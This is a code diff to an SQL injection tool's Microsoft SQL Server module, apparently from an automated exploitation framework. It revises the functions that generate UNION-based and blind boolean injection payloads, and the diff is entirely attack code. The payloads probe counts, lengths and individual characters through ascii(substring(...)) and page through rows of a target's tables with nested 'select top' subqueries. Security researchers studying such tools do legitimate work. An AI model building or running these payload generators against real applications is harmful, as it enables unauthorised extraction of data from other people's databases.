@@ -53,7 +53,7 @@ class SQLServerMole(DbmsMole):
     def _columns_query_info(self, db, table):
         return {
             'table' : '[{db}]..syscolumns,[{db}]..sysobjects'.format(db=db),
-            'field' : ['[{db}]..syscolumns.name'.format(db=db)],
+            'field' : ['name'.format(db=db)],
             'filter': "[{db}]..syscolumns.id = [{db}]..sysobjects.id and [{db}]..sysobjects.name = '{table}'".format(db=db, table=table)
         }
 
@@ -67,22 +67,37 @@ class SQLServerMole(DbmsMole):
     def _dbinfo_query_info(self):
         return {
             'field' : ['user_name()','@@version','db_name()'],
-            'table' : 'information_schema.schemata'
+            'table' : ''
         }
 
 
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
-        return (' and {op_par}' + (str(value) + ' < (select top 1 ascii(substring({fields}, '+str(index)+', 1)) from ' +
-               '{table} where {where} and {fields} not in (select top {off} {fields} from {table} where {where}))').format(
-                    table=table, fields=self._concat_fields(fields), where=self.parse_condition(where), off=offset)
+        fields_joined = self._join_fields_with_table(fields,table)
+        query = ' and {op_par}' + str(value) + ' < (select ascii(substring({field}, '.format(field=self._concat_fields(fields))+str(index)+', 1))'
+        if len(table) > 0:
+            query += (' from (select top 1 {fields_comma} from {table} where {fields} not in (select top {off} {fields} from ' +
+               '{table} where {where} order by 1 ASC) and {where} order by 1 ASC) as T)').format(
+                    table=table, fields=self._concat_fields(fields_joined), fields_comma=','.join(fields_joined),
+                    where=self.parse_condition(where), off=offset
                 )
+        else:
+            query += ')'
+        return query
 
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
         return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'
 
     def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
-        return (' and {op_par}' + (str(value) + ' ' + operator + ' (select top 1 len({field}) from {table} where ' +
-                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=self._concat_fields(fields),where=self.parse_condition(where),off=offset))
+        fields_joined = self._join_fields_with_table(fields,table)
+        query = ' and {op_par}' + str(value) + ' ' + operator + ' (select len({field})'.format(field=self._concat_fields(fields))
+        if len(table) > 0:
+            query += (' from (select top 1 {fields_comma} from {table} where {field} not in (select top {off} {field} ' + 
+                'from {table} where {where} order by 1 ASC) and {where} order by 1 ASC) as T)').format(
+                table=table,field=self._concat_fields(fields_joined),fields_comma=','.join(fields_joined),
+                where=self.parse_condition(where),off=offset)
+        else:
+            query += ')'
+        return query
 
     @classmethod
     def blind_field_delimiter(cls):
@@ -143,58 +158,69 @@ class SQLServerMole(DbmsMole):
     def set_good_finger(self, finger):
         self.finger = finger
 
+    def _join_fields_with_table(self, fields, table):
+        return list(map(lambda i: table.split(',')[0] + '.' + i, fields))
+
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
-        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(' + ','.join(fields) + ') as varchar(50))+' + SQLServerMole.out_delimiter)
+        query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(*) as varchar(50))+' + SQLServerMole.out_delimiter)
         query += ','.join(query_list)
         return query + " from " + table_name + " where " + self.parse_condition(where)
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        fields = self._concat_fields(fields)
-        query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + fields + "+" + SQLServerMole.out_delimiter)
+        query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + self._concat_fields(fields) + "+" + SQLServerMole.out_delimiter)
         where = self.parse_condition(where)
         query += ','.join(query_list)
-        query += (" from " + table_name + " where " + fields +  " not in (select top " +
-                  str(offset) + " " + fields + " from " + table_name + " where " + where + ") and ")
-        query += where
+        fields = self._join_fields_with_table(fields, table_name)
+        if len(table_name) > 0:
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +  
+                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " + 
+                      where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
     def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
-        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('cast(cast('+SQLServerMole.integer_out_delimiter +
-                ' as varchar(10))+cast(count(' + ','.join(fields) + ') as varchar(50))+' +
+                ' as varchar(10))+cast(count(*) as varchar(50))+' +
                 'cast(' + SQLServerMole.integer_out_delimiter + ' as varchar(10)) as bigint)')
         query += ','.join(query_list)
-        return query + " from " + table_name + " where " + self.parse_condition(where)
+        if len(table_name) > 0:
+            query += " from " + table_name + " where " + self.parse_condition(where)
+        return query
 
     def forge_integer_len_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        fields = self._concat_fields(fields)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
-                                        "cast(len(" + fields + ") as varchar(30))+cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
+                                        "cast(len(" + self._concat_fields(fields) + ") as varchar(30))+cast(" + 
+                                        SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         where = self.parse_condition(where)
         query += ','.join(query_list)
-        query += (" from " + table_name + " where " + fields +  " not in (select top " +
-                  str(offset) + " " + fields + " from " + table_name + " where " + where + ") and ")
-        query += where
+        fields = self._join_fields_with_table(fields, table_name)
+        if len(table_name) > 0:
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +  
+                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " + 
+                      where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
     def forge_integer_query(self, column_count, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        fields = self._concat_fields(fields)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
-                                        "cast(ascii(substring(" + fields + "," + str(index) + ",1)) as varchar(30))+cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
+                                        "cast(ascii(substring(" + self._concat_fields(fields) + "," + str(index) + ",1)) as varchar(30))+cast(" + 
+                                        SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         where = self.parse_condition(where)
         query += ','.join(query_list)
-        query += (" from " + table_name + " where " + fields +  " not in (select top " +
-                  str(offset) + " " + fields + " from " + table_name + " where " + where + ") and ")
-        query += where
+        fields = self._join_fields_with_table(fields, table_name)
+        if len(table_name) > 0:
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + 
+                      self._concat_fields(fields) +  " not in (select top " + str(offset) + " " + 
+                      self._concat_fields(fields) + " from " + table_name + " where " + where + " order by 1 ASC) and " + 
+                      where + " order by 1 ASC) as T")
         return query
 
     def _concat_fields(self, fields):
